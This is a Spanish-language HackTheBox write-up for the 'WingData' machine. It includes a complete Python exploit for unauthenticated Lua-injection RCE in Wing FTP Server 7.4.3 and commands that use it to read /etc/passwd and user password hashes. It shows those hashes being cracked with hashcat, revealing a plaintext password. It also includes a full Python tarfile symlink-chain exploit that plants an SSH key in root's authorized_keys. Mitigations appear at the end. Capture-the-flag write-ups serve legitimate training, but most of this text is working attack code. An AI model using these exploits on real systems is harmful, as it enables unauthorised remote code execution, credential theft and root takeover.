# WingData - HackTheBox WriteUp

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Rating](https://img.shields.io/badge/Rating-3.3-yellow)

---

## Índice

- [Reconocimiento](#reconocimiento)
- [Enumeración Web](#enumeración-web)
- [Explotación Inicial - CVE-2025-47812](#explotación-inicial---cve-2025-47812)
- [Acceso al Sistema](#acceso-al-sistema)
- [Escalación de Privilegios - CVE-2025-4138](#escalación-de-privilegios---cve-2025-4138)
- [Flags](#flags)
- [Conclusiones](#conclusiones)

---

## Reconocimiento

### Escaneo de Puertos

```bash
nmap -sS -sCV --open -p- --min-rate 5000 -n -Pn 10.129.5.135 -oN escaneo.txt
```

**Resultados:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
```

### Resolución DNS

Agregamos el dominio al archivo hosts:

```bash
echo "10.129.5.135 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

---

## Enumeración Web

### Sitio Principal (wingdata.htb)

Al visitar `http://wingdata.htb` encontramos:

- **Empresa:** WingData Solutions - empresa de soluciones de transferencia de archivos
- **Portal Cliente:** Link a `http://ftp.wingdata.htb/`
- **Servicios:** Transferencia segura de archivos, colaboración global, cumplimiento normativo

### Portal FTP (ftp.wingdata.htb)

Al acceder a `http://ftp.wingdata.htb/` encontramos:

```
Wing FTP Server - Web Client
Version: 7.4.3
```

![Wing FTP Login](https://i.imgur.com/example.png)

**Campos del login:**
- Cuenta (username)
- Contraseña (password)
- Idioma
- Opción "Recordar"

### Búsqueda de Vulnerabilidades

Buscamos vulnerabilidades conocidas para Wing FTP Server 7.4.3:

```bash
searchsploit wing ftp 7.4.3
```

**Encontramos:** 
- **CVE-2025-47812** - Wing FTP Server 7.4.3 - Unauthenticated Remote Code Execution

---

## Explotación Inicial - CVE-2025-47812

### Descripción de la Vulnerabilidad

**CVE-2025-47812** es una vulnerabilidad de **RCE sin autenticación** en Wing FTP Server ≤ 7.4.3 que surge por:

1. **Manejo incorrecto de bytes NULL** en el parámetro `username` durante el login
2. **Inyección de código Lua** en archivos de sesión
3. **Ejecución automática** cuando se acceden funcionalidades autenticadas

### Funcionamiento del Exploit

```
┌─────────────────────────────────────────────────────────────┐
│                    EXPLOIT FLOW                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. POST /loginok.html                                       │
│     username=anonymous%00]]%0d<LUA_CODE>%0d--                │
│     ↓                                                        │
│  2. c_CheckUser() trunca en NULL → ve "anonymous" ✓         │
│     Session creation → guarda username COMPLETO (con Lua)    │
│     ↓                                                        │
│  3. Servidor retorna cookie UID                              │
│     ↓                                                        │
│  4. GET /dir.html con cookie UID                             │
│     ↓                                                        │
│  5. Servidor ejecuta código Lua del session file            │
│     ↓                                                        │
│  6. CÓDIGO EJECUTADO como wingftp user                       │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Exploit Script

Descargamos el exploit de Exploit-DB:

```python
# exploit.py - CVE-2025-47812
import requests
import re
import argparse

def run_exploit(target_url, command, username="anonymous", verbose=False):
    login_url = f"{target_url}/loginok.html"
    
    login_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    # Payload con inyección de código Lua
    from urllib.parse import quote
    encoded_username = quote(username)
    
    payload = (
        f"username={encoded_username}%00]]%0d"
        f"local+h+%3d+io.popen(\"{command}\")%0d"
        f"local+r+%3d+h%3aread(\"*a\")%0d"
        f"h%3aclose()%0d"
        f"print(r)%0d--&password="
    )
    
    # Paso 1: Login con payload
    login_response = requests.post(login_url, headers=login_headers, data=payload)
    
    # Extraer UID de la cookie
    set_cookie = login_response.headers.get("Set-Cookie", "")
    match = re.search(r'UID=([^;]+)', set_cookie)
    uid = match.group(1)
    
    # Paso 2: Trigger de ejecución
    dir_url = f"{target_url}/dir.html"
    dir_headers = {"Cookie": f"UID={uid}"}
    
    dir_response = requests.get(dir_url, headers=dir_headers)
    
    # Extraer output (antes del XML)
    body = dir_response.text
    clean_output = re.split(r'<\?xml', body)[0].strip()
    
    return clean_output
```

### Prueba de Concepto

**1. Verificar acceso:**

```bash
python3 exploit.py -u http://ftp.wingdata.htb -c "id" -v
```

**Output:**
```
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),...
```

**2. Enumerar el sistema:**

```bash
python3 exploit.py -u http://ftp.wingdata.htb -c "cat /etc/passwd" -v
```

**Usuarios encontrados:**
```
root:x:0:0:root:/root:/bin/bash
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```

---

## Acceso al Sistema

### Extracción de Credenciales

**1. Ubicación de archivos de configuración:**

```bash
python3 exploit.py -u http://ftp.wingdata.htb \
    -c "find /opt/wftpserver -name '*.xml'" -v
```

**Encontramos:**
```
/opt/wftpserver/Data/1/users/wacky.xml
/opt/wftpserver/Data/1/users/john.xml
/opt/wftpserver/Data/1/users/maria.xml
/opt/wftpserver/Data/1/users/steve.xml
/opt/wftpserver/Data/1/users/anonymous.xml
```

**2. Leer archivo de usuario wacky:**

```bash
python3 exploit.py -u http://ftp.wingdata.htb \
    -c "cat /opt/wftpserver/Data/1/users/wacky.xml" -v
```

**Contenido relevante:**
```xml
<UserName>wacky</UserName>
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

### Cracking de Hashes

**1. Identificar formato del hash:**

Wing FTP usa: `sha256($salt.$pass)` donde salt = "WingFTP"

**2. Crear archivo de hashes:**

```bash
cat > hashes.txt << EOF
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
EOF
```

**3. Ejecutar Hashcat:**

```bash
hashcat -m 1410 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

**Credenciales:** `wacky:!#7Blushing^*Bride5`

### SSH Login

```bash
ssh wacky@10.129.5.135
```

```
wacky@wingdata:~$ cat user.txt
```

✅ **User Flag obtenida!**

---

## Escalación de Privilegios - CVE-2025-4138

### Enumeración de Privilegios

```bash
sudo -l
```

**Output:**
```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 
        /opt/backup_clients/restore_backup_clients.py *
```

### Análisis del Script Vulnerable

```bash
cat /opt/backup_clients/restore_backup_clients.py
```

**Código clave:**
```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def main():
    # ... validación de argumentos ...
    
    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    os.makedirs(staging_dir, exist_ok=True)
    
    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")  # ← VULNERABLE
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
```

**Vulnerabilidad identificada:**
- Script usa `tarfile.extractall()` con `filter="data"`
- Python versión: `3.12.3` (vulnerable a CVE-2025-4138)
- Se ejecuta como root via sudo

### CVE-2025-4138 / CVE-2025-4517

**Descripción:**

Vulnerabilidad crítica en el módulo `tarfile` de Python que permite **bypass del filtro de extracción** mediante:

1. **PATH_MAX Overflow**: `os.path.realpath()` deja de resolver rutas cuando exceden PATH_MAX (4096 bytes)
2. **Symlink Chain Attack**: Cadena de symlinks infla la ruta resuelta
3. **Filter Bypass**: El filtro valida la ruta truncada, pero el kernel extrae la ruta real
4. **Arbitrary File Write**: Escritura de archivos fuera del directorio de extracción

**Versiones afectadas:**
- Python 3.12.0 - 3.12.10 ✅ (3.12.3 vulnerable)
- Python 3.13.0 - 3.13.3

**CVSS Score:** 9.4 (Critical)

### Funcionamiento Técnico del Exploit

```
┌────────────────────────────────────────────────────────────┐
│              CVE-2025-4138 EXPLOIT STAGES                   │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  Stage 1: PATH_MAX Inflation                                │
│  ─────────────────────────────────                          │
│  Crear 16 niveles de:                                       │
│    - Directorio: 247 caracteres (ddd...ddd)                │
│    - Symlink: 1 carácter (a→ddd, b→ddd, ...)               │
│                                                             │
│  Ruta corta:     a/b/c/d/.../p           (~31 chars)       │
│  Ruta resuelta:  ddd.../ddd.../ddd...    (~3968 chars)     │
│                                          ↑ cerca PATH_MAX   │
│                                                             │
│  Stage 2: Pivot Symlink                                     │
│  ──────────────────────                                     │
│  a/b/.../p/lll...lll → ../../../../... (×16)               │
│                                                             │
│  realpath() NO puede resolver (>PATH_MAX)                  │
│  → Filter dice "OK" ✓                                       │
│  → Kernel SÍ resuelve en extracción                         │
│  → Escapa del directorio ✗                                  │
│                                                             │
│  Stage 3: Escape Symlink                                    │
│  ───────────────────────                                    │
│  escape → <pivot>/../../../root/.ssh                        │
│                                                             │
│  Stage 4: Payload Write                                     │
│  ──────────────────────                                     │
│  escape/authorized_keys = SSH_PUBLIC_KEY                    │
│                                                             │
│  ✓ Archivo escrito en /root/.ssh/authorized_keys           │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

### Exploit Script

Creamos el exploit completo:

```python
#!/usr/bin/env python3
"""
CVE-2025-4138 / CVE-2025-4517 — Python tarfile PATH_MAX Filter Bypass
"""

import tarfile
import io
import os
import sys
import argparse

# Constantes para Linux
DIR_COMP_LEN = 247
CHAIN_STEPS = "abcdefghijklmnop"  # 16 niveles
LONG_LINK_LEN = 254

def build_exploit_tar(tar_path, target_file, payload, file_mode=0o644):
    """
    Construye archivo TAR malicioso para CVE-2025-4138
    """
    comp = "d" * DIR_COMP_LEN
    inner_path = ""
    
    with tarfile.open(tar_path, "w") as tar:
        # Stage 1: Cadena de symlinks
        for step_char in CHAIN_STEPS:
            # Directorio largo
            d = tarfile.TarInfo(name=os.path.join(inner_path, comp))
            d.type = tarfile.DIRTYPE
            tar.addfile(d)
            
            # Symlink corto → directorio largo
            s = tarfile.TarInfo(name=os.path.join(inner_path, step_char))
            s.type = tarfile.SYMTYPE
            s.linkname = comp
            tar.addfile(s)
            
            inner_path = os.path.join(inner_path, comp)
        
        # Stage 2: Pivot symlink (excede PATH_MAX)
        short_chain = "/".join(CHAIN_STEPS)
        link_name = os.path.join(short_chain, "l" * LONG_LINK_LEN)
        
        pivot = tarfile.TarInfo(name=link_name)
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../" * len(CHAIN_STEPS)
        tar.addfile(pivot)
        
        # Stage 3: Escape symlink
        target_dir = os.path.dirname(target_file)
        target_basename = os.path.basename(target_file)
        
        depth = 8
        escape_linkname = (
            link_name + "/" + ("../" * depth) + target_dir.lstrip("/")
        )
        
        esc = tarfile.TarInfo(name="escape")
        esc.type = tarfile.SYMTYPE
        esc.linkname = escape_linkname
        tar.addfile(esc)
        
        # Stage 4: Write payload
        payload_entry = tarfile.TarInfo(name=f"escape/{target_basename}")
        payload_entry.type = tarfile.REGTYPE
        payload_entry.size = len(payload)
        payload_entry.mode = file_mode
        payload_entry.uid = 0
        payload_entry.gid = 0
        tar.addfile(payload_entry, fileobj=io.BytesIO(payload))
    
    print(f"[+] Exploit tar: {tar_path}")
    print(f"[+] Target: {target_file}")
    print(f"[+] Payload size: {len(payload)} bytes")

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-4138 Exploit")
    parser.add_argument("--tar-out", "-o", required=True)
    parser.add_argument("--preset", "-p", choices=["ssh-key"])
    parser.add_argument("--payload", "-P", required=True)
    args = parser.parse_args()
    
    if args.preset == "ssh-key":
        target_file = "/root/.ssh/authorized_keys"
        file_mode = 0o600
        
        # Leer SSH key
        with open(os.path.expanduser(args.payload), "rb") as f:
            payload = f.read()
        if not payload.endswith(b"\n"):
            payload += b"\n"
    
    build_exploit_tar(args.tar_out, target_file, payload, file_mode)

if __name__ == "__main__":
    main()
```

### Explotación Paso a Paso

**1. Generar par de claves SSH:**

```bash
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""
```

**Output:**
```
Your identification has been saved in /home/wacky/.ssh/wingdata_key
Your public key has been saved in /home/wacky/.ssh/wingdata_key.pub
```

**2. Crear TAR malicioso:**

```bash
python3 exploit.py \
    --preset ssh-key \
    --payload ~/.ssh/wingdata_key.pub \
    --tar-out backup_888.tar
```

**Output:**
```
[+] Exploit tar: backup_888.tar
[+] Target: /root/.ssh/authorized_keys
[+] Payload size: 96 bytes
```

**3. Mover a directorio de backups:**

```bash
mv backup_888.tar /opt/backup_clients/backups/
```

**4. Trigger de extracción como root:**

```bash
sudo /usr/local/bin/python3 \
    /opt/backup_clients/restore_backup_clients.py \
    -b backup_888.tar \
    -r restore_win123
```

**Output:**
```
[+] Backup: backup_888.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_win123
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_win123
```

**5. Conectar como root via SSH:**

```bash
ssh -i ~/.ssh/wingdata_key root@127.0.0.1
```

```
root@wingdata:~# id
uid=0(root) gid=0(root) groups=0(root)

root@wingdata:~# cat /root/root.txt
```

✅ **Root Flag obtenida!**

---


## Conclusiones

### Resumen del Ataque

```
┌─────────────────────────────────────────────────────────┐
│                   ATTACK CHAIN                           │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. Reconocimiento                                       │
│     ├─ Nmap: Puerto 80 (HTTP), 22 (SSH)                │
│     ├─ Wing FTP Server 7.4.3 identificado              │
│     └─ Búsqueda de CVEs                                 │
│                                                          │
│  2. Explotación Inicial (CVE-2025-47812)                │
│     ├─ RCE sin autenticación                            │
│     ├─ Inyección Lua en session file                    │
│     ├─ Ejecución como usuario wingftp                   │
│     └─ Extracción de hashes de usuarios                 │
│                                                          │
│  3. Lateral Movement                                     │
│     ├─ Cracking de hash sha256($salt.$pass)            │
│     ├─ Credenciales: wacky:!#7Blushing^*Bride5         │
│     └─ SSH login + User Flag                            │
│                                                          │
│  4. Escalación de Privilegios (CVE-2025-4138)           │
│     ├─ Sudo: python3 restore_backup_clients.py         │
│     ├─ Python 3.12.3 vulnerable                         │
│     ├─ PATH_MAX symlink bypass                          │
│     ├─ Escritura en /root/.ssh/authorized_keys         │
│     └─ SSH login como root + Root Flag                  │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### Lecciones Aprendidas

**1. CVE-2025-47812 (Wing FTP RCE):**
- Nunca confiar en validaciones del lado del cliente
- Bytes NULL pueden causar discrepancias en el procesamiento
- Session files ejecutables son un vector de ataque

**2. CVE-2025-4138 (Python tarfile):**
- Filtros de extracción no son una solución completa
- PATH_MAX es un límite del sistema que causa comportamientos inesperados
- TOCTOU (Time-of-Check-to-Time-of-Use) entre validación y ejecución
- Cadenas de symlinks profundas pueden evadir controles

### Mitigaciones

**Para CVE-2025-47812:**
```bash
# Actualizar Wing FTP Server
wget https://www.wftpserver.com/download.htm
# Versión parcheada: 7.4.4+
```

**Para CVE-2025-4138:**
```bash
# Actualizar Python
python3 --version  # Verificar versión

# Versiones parcheadas:
# - Python 3.9.23+
# - Python 3.10.18+
# - Python 3.11.13+
# - Python 3.12.11+
# - Python 3.13.4+

# Debian/Ubuntu
sudo apt update && sudo apt upgrade python3
```

**Workaround temporal:**
```python
# Validar manualmente antes de extraer
import pathlib

for member in tar.getmembers():
    if member.linkname:
        parts = pathlib.PurePosixPath(member.linkname).parts
        if ".." in parts:
            raise ValueError(f"Traversal detected: {member.name}")
```

